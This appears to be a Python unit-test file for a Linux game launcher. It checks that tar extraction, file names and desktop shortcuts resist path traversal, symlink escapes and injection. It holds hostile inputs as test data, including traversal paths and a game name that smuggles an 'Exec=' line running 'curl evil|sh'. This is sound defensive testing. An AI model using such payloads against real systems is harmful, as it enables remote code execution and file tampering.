"""Regression tests for the untrusted inputs GameHandler handles.

Release archives and asset names come from GitHub, and game names come from
whatever the user (or a Steam lookup) typed. Both reach the filesystem.
"""

import io
import os
import tarfile
import tempfile
import unittest
from pathlib import Path

from gamehandler.covers import MAX_RESPONSE_BYTES
from gamehandler.installers import safe_download_name
from gamehandler.models import Game
from gamehandler.runners import (
    ProtonManager,
    ReleaseInfo,
    create_desktop_shortcut,
    desktop_exec,
    escape_desktop_value,
    extract_archive,
    safe_archive_name,
    safe_install_id,
)


def _tar_with(members, root: Path, name: str = "evil.tar") -> Path:
    """Build a tarball whose members are (arcname, data, kind) triples."""
    path = root / name
    with tarfile.open(path, "w") as tar:
        for arcname, data, kind in members:
            if kind == "file":
                info = tarfile.TarInfo(arcname)
                payload = data.encode()
                info.size = len(payload)
                info.mode = 0o755
                tar.addfile(info, io.BytesIO(payload))
            elif kind == "symlink":
                info = tarfile.TarInfo(arcname)
                info.type = tarfile.SYMTYPE
                info.linkname = data
                tar.addfile(info)
    return path


class ArchiveExtractionTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.dest = self.root / "runners"
        self.dest.mkdir()

    def test_normal_archive_extracts_and_keeps_the_executable_bit(self):
        archive = _tar_with(
            [("GE-Proton/files/bin/wine", "#!/bin/sh\n", "file")], self.root, "ok.tar"
        )
        extract_archive(archive, self.dest)
        wine = self.dest / "GE-Proton" / "files" / "bin" / "wine"
        self.assertTrue(wine.is_file())
        self.assertTrue(os.access(wine, os.X_OK), "Wine builds must stay executable")

    def test_parent_traversal_member_is_refused(self):
        archive = _tar_with([("../escaped.txt", "pwned", "file")], self.root)
        with self.assertRaises(Exception):
            extract_archive(archive, self.dest)
        self.assertFalse((self.root / "escaped.txt").exists())

    def test_absolute_member_is_confined_to_the_destination(self):
        archive = _tar_with([("/tmp/gh-absolute-escape", "pwned", "file")], self.root)
        extract_archive(archive, self.dest)
        # The leading separator is stripped rather than honoured, so the member
        # lands inside the runners directory and never at the absolute path.
        self.assertFalse(Path("/tmp/gh-absolute-escape").exists())
        self.assertTrue((self.dest / "tmp" / "gh-absolute-escape").is_file())

    def test_symlink_escaping_the_destination_is_refused(self):
        archive = _tar_with([("link", "../../outside", "symlink")], self.root)
        with self.assertRaises(Exception):
            extract_archive(archive, self.dest)


class NameSanitisationTests(unittest.TestCase):
    def test_asset_names_are_reduced_to_a_bare_filename(self):
        self.assertEqual(safe_archive_name("GE-Proton9-5.tar.gz"), "GE-Proton9-5.tar.gz")
        self.assertEqual(safe_archive_name("../../etc/cron.d/x"), "x")
        self.assertEqual(safe_archive_name("/etc/passwd"), "passwd")
        self.assertEqual(safe_archive_name(".."), "runner.tar.gz")
        self.assertEqual(safe_archive_name(""), "runner.tar.gz")
        self.assertEqual(safe_archive_name("", "fallback.tgz"), "fallback.tgz")

    def test_install_ids_that_could_escape_are_rejected(self):
        self.assertEqual(safe_install_id("GE-Proton9-5"), "GE-Proton9-5")
        for bad in ("..", "../../home", "a/b", "", ".hidden", "a\\b"):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                safe_install_id(bad)

    def test_download_filenames_are_reduced_to_a_bare_filename(self):
        self.assertEqual(safe_download_name("SteamSetup.exe"), "SteamSetup.exe")
        self.assertEqual(safe_download_name("../../evil.exe"), "evil.exe")
        self.assertEqual(safe_download_name("", "steam"), "steam.exe")

    def test_uninstall_refuses_to_walk_out_of_the_runners_directory(self):
        with tempfile.TemporaryDirectory() as tmp:
            manager = ProtonManager(Path(tmp) / "runners")
            with self.assertRaises(ValueError):
                manager.uninstall("../../")

    def test_uninstall_ignores_a_symlinked_runner_directory(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            runners = root / "runners"
            runners.mkdir()
            precious = root / "precious"
            precious.mkdir()
            (precious / "keep.txt").write_text("keep")
            (runners / "linked").symlink_to(precious, target_is_directory=True)
            ProtonManager(runners).uninstall("linked")
            self.assertTrue((precious / "keep.txt").exists())

    def test_install_id_is_derived_from_the_tag_not_the_asset_name(self):
        release = ReleaseInfo(
            tag="GE-Proton9-5", name="../../evil.tar.gz", download_url="", size=0
        )
        self.assertEqual(safe_install_id(release.install_id), "GE-Proton9-5")


class DesktopEntryTests(unittest.TestCase):
    def test_newlines_in_a_value_are_escaped(self):
        self.assertEqual(escape_desktop_value("a\nb"), "a\\nb")
        self.assertEqual(escape_desktop_value("a\tb"), "a\\tb")
        self.assertEqual(escape_desktop_value("a\\b"), "a\\\\b")

    def test_percent_is_escaped_only_in_exec(self):
        self.assertEqual(desktop_exec("run %f"), "run %%f")
        self.assertEqual(escape_desktop_value("100% done"), "100% done")

    def test_a_malicious_game_name_cannot_inject_desktop_keys(self):
        with tempfile.TemporaryDirectory() as tmp:
            game = Game(name="Doom\nExec=/bin/sh -c 'curl evil|sh'\nName=Doom")
            path = create_desktop_shortcut(game, "gamehandler --launch 1", Path(tmp))
            body = path.read_text(encoding="utf-8")
            exec_lines = [line for line in body.splitlines() if line.startswith("Exec=")]
            self.assertEqual(exec_lines, ["Exec=gamehandler --launch 1"])
            self.assertEqual(
                len([line for line in body.splitlines() if line.startswith("Name=")]), 1
            )

    def test_shortcut_is_a_valid_single_group_entry(self):
        with tempfile.TemporaryDirectory() as tmp:
            game = Game(name="Hades II")
            path = create_desktop_shortcut(game, "gamehandler --launch abc", Path(tmp))
            lines = path.read_text(encoding="utf-8").splitlines()
            self.assertEqual(lines[0], "[Desktop Entry]")
            self.assertIn("Name=Hades II", lines)
            self.assertIn("Type=Application", lines)
            self.assertTrue(os.access(path, os.X_OK))


class DownloadLimitTests(unittest.TestCase):
    def test_cover_downloads_are_bounded(self):
        self.assertLessEqual(MAX_RESPONSE_BYTES, 32 * 1024 * 1024)


if __name__ == "__main__":
    unittest.main()
